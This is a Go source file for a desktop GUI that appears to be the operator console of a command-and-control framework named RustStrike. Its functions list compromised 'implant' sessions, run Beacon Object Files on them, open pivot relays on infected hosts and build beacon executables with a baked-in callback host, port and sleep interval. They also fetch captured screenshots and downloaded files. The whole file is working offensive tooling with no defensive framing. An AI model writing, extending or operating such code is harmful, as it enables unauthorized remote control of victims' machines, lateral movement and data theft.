package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/wailsapp/wails/v2/pkg/runtime"
)

// App is the Wails-bound bridge between the Vue frontend and the Go service
// core (clients/server). All implant/BOF actions go through the core's REST
// API; the core's WebSocket event stream is forwarded to the frontend as Wails
// events ("core:event").
type App struct {
	ctx       context.Context
	coreURL   string // e.g. http://127.0.0.1:8091
	coreToken string
}

func NewApp() *App { return &App{} }

func (a *App) startup(ctx context.Context) {
	a.ctx = ctx
	// Core address is configurable via env (RUSTSTRIKE_CORE).
	a.coreURL = strings.TrimRight(coreBaseURL(), "/")
	a.coreToken = coreAuthToken()
	// Kick off the WebSocket listener that forwards core events to the UI.
	go a.forwardEvents()
}

// ---- types returned to the frontend ----

// Implant is one connected implant session, enriched with the recon fields
// the auto-run sysinfo BOF collects (empty until that BOF reports back).
type Implant struct {
	ID          uint64 `json:"id"`
	Addr        string `json:"addr"`
	Since       int64  `json:"since"`
	LastSeen    int64  `json:"last_seen"`
	InternalIP  string `json:"internal_ip"`
	ExternalIP  string `json:"external_ip"`
	User        string `json:"user"`
	Computer    string `json:"computer"`
	ProcessName string `json:"process_name"`
	PID         string `json:"pid"`
	OS          string `json:"os"`
	OSBuild     string `json:"os_build"`
	Arch        string `json:"arch"`
	OnlineTime  string `json:"online_time"`
}

type BofEntry struct {
	Name string `json:"name"`
	Size int64  `json:"size"`
}

// TaskResult is the polled result of a BOF execution. Status is "running"
// (output not yet arrived), "completed", or "failed".
type TaskResult struct {
	ID     string `json:"id"`
	Status string `json:"status"`
	Output string `json:"output"`
}

type CoreEvent struct {
	Type      string `json:"type"`
	ImplantID uint64 `json:"implant_id"`
	Data      string `json:"data"`
}

// ---- REST wrappers (frontend calls these via the generated bindings) ----

// SetAuthToken lets the frontend restore a persisted bearer token into the Go
// bridge after an app restart. The core still validates it on every request.
func (a *App) SetAuthToken(token string) {
	a.coreToken = strings.TrimSpace(token)
}

// Login authenticates against the core and stores the returned bearer token for
// subsequent REST calls and WebSocket reconnects.
func (a *App) Login(username, password string) (string, error) {
	body := map[string]string{"username": username, "password": password}
	var resp struct {
		Success bool `json:"success"`
		Data    struct {
			Token string `json:"token"`
		} `json:"data"`
		Error string `json:"error"`
	}
	if err := a.postPublic("/api/auth/login", body, &resp); err != nil {
		return "", err
	}
	if !resp.Success || resp.Data.Token == "" {
		if resp.Error != "" {
			return "", fmt.Errorf("%s", resp.Error)
		}
		return "", fmt.Errorf("login failed")
	}
	a.coreToken = resp.Data.Token
	return resp.Data.Token, nil
}

// ListImplants returns all currently-connected implant sessions.
func (a *App) ListImplants() ([]Implant, error) {
	var out []Implant
	if err := a.get("/api/implants", &out); err != nil {
		return nil, err
	}
	return out, nil
}

// Hello sends a link-check to an implant.
func (a *App) Hello(id uint64) error {
	return a.post(fmt.Sprintf("/api/implants/%d/hello", id), nil, nil)
}

// RunBofByName runs a library BOF on an implant and returns the task id the
// GUI polls for output. argsB64 is a base64 raw arg buffer (may be "").
func (a *App) RunBofByName(id uint64, bofName string, argsB64 string) (string, error) {
	body := map[string]string{"bof": bofName, "args": argsB64}
	var resp struct {
		TaskID string `json:"task_id"`
	}
	if err := a.post(fmt.Sprintf("/api/bofs/%s/run?implant=%d", bofName, id), body, &resp); err != nil {
		return "", err
	}
	return resp.TaskID, nil
}

// RunBofByB64 runs a raw base64 COFF on an implant and returns the task id.
func (a *App) RunBofByB64(id uint64, cofB64 string, argsB64 string) (string, error) {
	body := map[string]string{"bof": cofB64, "args": argsB64}
	var resp struct {
		TaskID string `json:"task_id"`
	}
	if err := a.post(fmt.Sprintf("/api/implants/%d/bof", id), body, &resp); err != nil {
		return "", err
	}
	return resp.TaskID, nil
}

// GetTaskResult polls a BOF task. Returns status "running" until the implant's
// output/error arrives, then "completed"/"failed" with the output text.
func (a *App) GetTaskResult(taskID string) (TaskResult, error) {
	var out TaskResult
	if err := a.get("/api/tasks/"+taskID, &out); err != nil {
		return TaskResult{}, err
	}
	return out, nil
}

// DropImplant closes an implant session.
func (a *App) DropImplant(id uint64) error {
	return a.del(fmt.Sprintf("/api/implants/%d", id), nil)
}

// ListBofs returns the BOF library.
func (a *App) ListBofs() ([]BofEntry, error) {
	var out []BofEntry
	if err := a.get("/api/bofs", &out); err != nil {
		return nil, err
	}
	return out, nil
}

// UploadBof stores a base64 COFF into the library under `name`.
func (a *App) UploadBof(name string, cofB64 string) error {
	body := map[string]string{"name": name, "file_b64": cofB64}
	return a.post("/api/bofs", body, nil)
}

// ---- Listeners (runtime start/stop of TCP implant listeners) ----

// ListenerEntry is one managed listener.
type ListenerEntry struct {
	ID        string `json:"id"`
	Name      string `json:"name"`
	Protocol  string `json:"protocol"`
	BindIP    string `json:"bind_ip"`
	Port      string `json:"port"`
	Active    bool   `json:"active"`
	CreatedTS int64  `json:"created_ts"`
}

func (a *App) ListListeners() ([]ListenerEntry, error) {
	var out []ListenerEntry
	if err := a.get("/api/listeners", &out); err != nil {
		return nil, err
	}
	return out, nil
}

func (a *App) CreateListener(name, bindIP, port string) (ListenerEntry, error) {
	body := map[string]string{"name": name, "bind_ip": bindIP, "port": port, "protocol": "tcp"}
	var resp struct {
		ID string `json:"id"`
	}
	if err := a.post("/api/listeners", body, &resp); err != nil {
		return ListenerEntry{}, err
	}
	return ListenerEntry{ID: resp.ID, Name: name, BindIP: bindIP, Port: port, Active: true}, nil
}

func (a *App) UpdateListener(id, name, bindIP, port string) error {
	body := map[string]string{"name": name, "bind_ip": bindIP, "port": port}
	return a.put(fmt.Sprintf("/api/listeners/%s", id), body, nil)
}

func (a *App) ToggleListener(id string, start bool) error {
	action := "stop"
	if start {
		action = "start"
	}
	return a.post(fmt.Sprintf("/api/listeners/%s/%s", id, action), nil, nil)
}

func (a *App) DeleteListener(id string) error {
	return a.del(fmt.Sprintf("/api/listeners/%s", id), nil)
}

// ---- Relays (pivot listeners running on an implant) ----

// RelayEntry is one pivot/relay listener on an implant.
type RelayEntry struct {
	ID        string `json:"id"`
	ImplantID uint64 `json:"implant_id"`
	BindIP    string `json:"bind_ip"`
	Port      uint16 `json:"port"`
	State     string `json:"state"`
	Error     string `json:"error,omitempty"`
}

// StartRelay asks an implant to open a TCP pivot listener. The actual bound
// port arrives async via the relay_started event; poll ListRelays for it.
// port=0 asks the OS for a free port.
func (a *App) StartRelay(id uint64, bindIP string, port uint16) (RelayEntry, error) {
	if bindIP == "" {
		bindIP = "0.0.0.0"
	}
	body := map[string]any{"bind_ip": bindIP, "port": port}
	var resp struct {
		RelayID string `json:"relay_id"`
	}
	if err := a.post(fmt.Sprintf("/api/implants/%d/relay", id), body, &resp); err != nil {
		return RelayEntry{}, err
	}
	return RelayEntry{ID: resp.RelayID, ImplantID: id, BindIP: bindIP, Port: port, State: "requested"}, nil
}

// ListRelays returns the relays running on an implant.
func (a *App) ListRelays(id uint64) ([]RelayEntry, error) {
	var out []RelayEntry
	if err := a.get(fmt.Sprintf("/api/implants/%d/relays", id), &out); err != nil {
		return nil, err
	}
	return out, nil
}

// StopRelay asks an implant to close one relay listener.
func (a *App) StopRelay(id uint64, relayID string) error {
	return a.del(fmt.Sprintf("/api/implants/%d/relays/%s", id, relayID), nil)
}

// ---- Stub builder ----

// sleepToInterval converts a Sleep Time (seconds) from the GUI into the decimal
// trailer interval the core appends for a beacon/cycle. <=0 means "omit" (the
// agent falls back to its default interval); a sane upper bound keeps the
// trailer short and guards against fat-fingered huge values.
func sleepToInterval(sleep int) string {
	if sleep <= 0 {
		return ""
	}
	if sleep > 3600 {
		sleep = 3600
	}
	return strconv.Itoa(sleep)
}

// dwellToTrailer converts a Dwell Time (seconds) from the GUI into the decimal
// trailer dwell field the core appends for a short-cycle beacon. <=0 means
// "omit" (the cycle crate falls back to its 2s default); a sane upper bound
// guards against huge values. Only the cycle variant reads this field.
func dwellToTrailer(dwell int) string {
	if dwell <= 0 {
		return ""
	}
	if dwell > 600 {
		dwell = 600
	}
	return strconv.Itoa(dwell)
}

// AgentTemplate is one entry in the Generate Agent dropdown, mirrored from the
// core's GET /api/agent/templates response.
type AgentTemplate struct {
	ID           string   `json:"id"`
	Name         string   `json:"name"`
	Description  string   `json:"description"`
	Base         string   `json:"base"`
	Variant      string   `json:"variant"`
	Supports     []string `json:"supports"`
	DefaultSleep int      `json:"default_sleep"`
	DefaultDwell int      `json:"default_dwell"`
}

// ListAgentTemplates fetches the agent templates from the core
// (GET /api/agent/templates) so the Generate Agent dropdown is data-driven
// instead of hardcoded. Returns an empty list (not an error) if the core has no
// templates dir — the stub builder still works via the beacon/cycle flags.
func (a *App) ListAgentTemplates() ([]AgentTemplate, error) {
	var resp struct {
		Success bool            `json:"success"`
		Data    []AgentTemplate `json:"data"`
		Error   string          `json:"error"`
	}
	if err := a.get("/api/agent/templates", &resp); err != nil {
		return nil, err
	}
	if !resp.Success {
		return nil, fmt.Errorf("%s", resp.Error)
	}
	return resp.Data, nil
}

// BuildStub patches a base implant/beacon/beacon-cycle exe with a host:port
// trailer and returns the patched bytes as base64 (the frontend triggers a
// blob download). silent selects the GUI-subsystem base exe (no console
// window). beacon selects the auto-reconnect beacon; cycle selects the
// short-cycle beacon (cycle wins over beacon when both are true). sleep
// (seconds, >0) is baked into the trailer as the callback interval (beacon) or
// sleep between check-ins (cycle); dwell (seconds, >0) is the cycle's
// connection-hold window. templateId, when non-empty, overrides the variant
// via the core's agent-template lookup.
func (a *App) BuildStub(host, port string, silent, beacon, cycle bool, sleep, dwell int, templateId string) (string, error) {
	body := map[string]any{
		"host":     host,
		"port":     port,
		"silent":   silent,
		"beacon":   beacon,
		"cycle":    cycle,
		"interval": sleepToInterval(sleep),
		"dwell":    dwellToTrailer(dwell),
		"template": templateId,
	}
	var resp struct {
		ExeB64 string `json:"exe_b64"`
	}
	if err := a.post("/api/stub/build", body, &resp); err != nil {
		return "", err
	}
	return resp.ExeB64, nil
}

// BuildStubToProject patches a base implant/beacon/beacon-cycle exe via the
// core (/api/stub/build, which only returns base64 — no project-local copy),
// then pops the OS "Save As" dialog so the operator chooses where to save the
// agent exe. Returns the chosen absolute path (JSON string {"path":""}) — path
// is empty if the operator cancelled. name suggests a default filename in the
// dialog. silent selects the GUI-subsystem base exe (no console window on
// launch). beacon selects the beacon base exe; cycle selects the short-cycle
// base exe (cycle wins over beacon when both are true); sleep (seconds, >0)
// is baked into the trailer as the callback interval; dwell (seconds, >0) is
// the cycle's connection-hold window. templateId overrides the variant via
// the core's agent-template lookup when non-empty.
func (a *App) BuildStubToProject(host, port, name string, silent, beacon, cycle bool, sleep, dwell int, templateId string) (string, error) {
	body := map[string]any{
		"host":     host,
		"port":     port,
		"silent":   silent,
		"beacon":   beacon,
		"cycle":    cycle,
		"interval": sleepToInterval(sleep),
		"dwell":    dwellToTrailer(dwell),
		"template": templateId,
	}
	var resp struct {
		ExeB64 string `json:"exe_b64"`
	}
	if err := a.post("/api/stub/build", body, &resp); err != nil {
		return "", err
	}
	if resp.ExeB64 == "" {
		return "", fmt.Errorf("no exe in core response")
	}
	// OS Save As dialog. Default to <name>.exe (variant-aware fallback).
	defName := strings.TrimSpace(name)
	if defName == "" {
		switch {
		case cycle:
			defName = "ruststrike-beacon-cycle"
		case beacon:
			defName = "ruststrike-beacon"
		default:
			defName = "ruststrike-implant"
		}
	}
	if !strings.HasSuffix(strings.ToLower(defName), ".exe") {
		defName += ".exe"
	}
	path, err := runtime.SaveFileDialog(a.ctx, runtime.SaveDialogOptions{
		DefaultFilename: defName,
		Title:           "Save generated agent exe",
		Filters: []runtime.FileFilter{
			{DisplayName: "Executable (*.exe)", Pattern: "*.exe"},
		},
	})
	if err != nil {
		return "", fmt.Errorf("save dialog: %w", err)
	}
	// Empty path = operator cancelled. Return empty (no error) so the GUI
	// can treat it as a no-op rather than a failure.
	if path == "" {
		out, _ := json.Marshal(map[string]string{"path": ""})
		return string(out), nil
	}
	// Decode base64 -> bytes -> write to the chosen path.
	raw, err := base64.StdEncoding.DecodeString(resp.ExeB64)
	if err != nil {
		return "", fmt.Errorf("decode exe: %w", err)
	}
	if err := os.WriteFile(path, raw, 0o644); err != nil {
		return "", fmt.Errorf("write exe: %w", err)
	}
	out, _ := json.Marshal(map[string]string{"path": path})
	return string(out), nil
}

// ---- Logs (persisted in SQLite) ----

// LogEntry is one persisted log row.
type LogEntry struct {
	ID        int64  `json:"id"`
	TS        int64  `json:"ts"`
	ImplantID uint64 `json:"implant_id"`
	Type      string `json:"type"`
	Data      string `json:"data"`
}

func (a *App) GetLogs(limit int, implantID uint64) ([]LogEntry, error) {
	q := fmt.Sprintf("/api/logs?limit=%d", limit)
	if implantID > 0 {
		q += fmt.Sprintf("&implant=%d", implantID)
	}
	var out []LogEntry
	if err := a.get(q, &out); err != nil {
		return nil, err
	}
	return out, nil
}

// ---- Agents + artifacts (persistent agent console) ----

// AgentEntry is one agent (live or historical).
type AgentEntry struct {
	ImplantID uint64 `json:"implant_id"`
	FirstSeen int64  `json:"first_seen"`
	LastSeen  int64  `json:"last_seen"`
	Addr      string `json:"addr"`
	Note      string `json:"note"`
	Online    bool   `json:"online"`
}

// ArtifactEntry is one captured BOF output (file_list/proc_list/screenshot/download).
type ArtifactEntry struct {
	ID        int64  `json:"id"`
	TS        int64  `json:"ts"`
	ImplantID uint64 `json:"implant_id"`
	Kind      string `json:"kind"`
	Path      string `json:"path,omitempty"`
	Meta      string `json:"meta,omitempty"`
	HasBlob   bool   `json:"has_blob"`
}

func (a *App) ListAgents() ([]AgentEntry, error) {
	var out []AgentEntry
	if err := a.get("/api/agents", &out); err != nil {
		return nil, err
	}
	return out, nil
}

func (a *App) ListArtifacts(implantID uint64, kind string, limit int) ([]ArtifactEntry, error) {
	q := fmt.Sprintf("/api/agents/%d/artifacts?limit=%d", implantID, limit)
	if kind != "" {
		q += "&kind=" + kind
	}
	var out []ArtifactEntry
	if err := a.get(q, &out); err != nil {
		return nil, err
	}
	return out, nil
}

// GetArtifact returns one artifact. For blob kinds (screenshot/download) it's
// the base64 bytes; for text kinds it's the meta.
func (a *App) GetArtifact(implantID, aid uint64) (string, string, string, error) {
	var out struct {
		ID   string `json:"id"`
		Kind string `json:"kind"`
		B64  string `json:"b64"`
		Meta string `json:"meta"`
	}
	if err := a.get(fmt.Sprintf("/api/agents/%d/artifacts/%d", implantID, aid), &out); err != nil {
		return "", "", "", err
	}
	return out.Kind, out.B64, out.Meta, nil
}

// ---- HTTP helpers ----

func (a *App) get(path string, out interface{}) error {
	req, err := http.NewRequest(http.MethodGet, a.coreURL+path, nil)
	if err != nil {
		return err
	}
	a.authorize(req)
	resp, err := a.client().Do(req)
	if err != nil {
		return fmt.Errorf("core unreachable: %w", err)
	}
	defer resp.Body.Close()
	return decode(resp, out)
}

func (a *App) post(path string, body interface{}, out interface{}) error {
	return a.postJSON(path, body, out, true)
}

func (a *App) postPublic(path string, body interface{}, out interface{}) error {
	return a.postJSON(path, body, out, false)
}

func (a *App) postJSON(path string, body interface{}, out interface{}, auth bool) error {
	var rd io.Reader
	if body != nil {
		b, _ := json.Marshal(body)
		rd = bytes.NewReader(b)
	}
	req, err := http.NewRequest(http.MethodPost, a.coreURL+path, rd)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	if auth {
		a.authorize(req)
	}
	resp, err := a.client().Do(req)
	if err != nil {
		return fmt.Errorf("core unreachable: %w", err)
	}
	defer resp.Body.Close()
	return decode(resp, out)
}

func (a *App) put(path string, body interface{}, out interface{}) error {
	var rd io.Reader
	if body != nil {
		b, _ := json.Marshal(body)
		rd = bytes.NewReader(b)
	}
	req, err := http.NewRequest(http.MethodPut, a.coreURL+path, rd)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	a.authorize(req)
	resp, err := a.client().Do(req)
	if err != nil {
		return fmt.Errorf("core unreachable: %w", err)
	}
	defer resp.Body.Close()
	return decode(resp, out)
}

func (a *App) del(path string, out interface{}) error {
	req, err := http.NewRequest(http.MethodDelete, a.coreURL+path, nil)
	if err != nil {
		return err
	}
	a.authorize(req)
	resp, err := a.client().Do(req)
	if err != nil {
		return fmt.Errorf("core unreachable: %w", err)
	}
	defer resp.Body.Close()
	return decode(resp, out)
}

func (a *App) client() *http.Client {
	return &http.Client{Timeout: 10 * time.Second}
}

func (a *App) authorize(req *http.Request) {
	if a.coreToken != "" {
		req.Header.Set("Authorization", "Bearer "+a.coreToken)
	}
}

func decode(resp *http.Response, out interface{}) error {
	if resp.StatusCode >= 400 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("core %s: %s", resp.Status, string(b))
	}
	if out == nil {
		return nil
	}
	return json.NewDecoder(resp.Body).Decode(out)
}

// keep the runtime import used (forwardEvents emits via runtime.EventsEmit).
var _ = runtime.EventsEmit
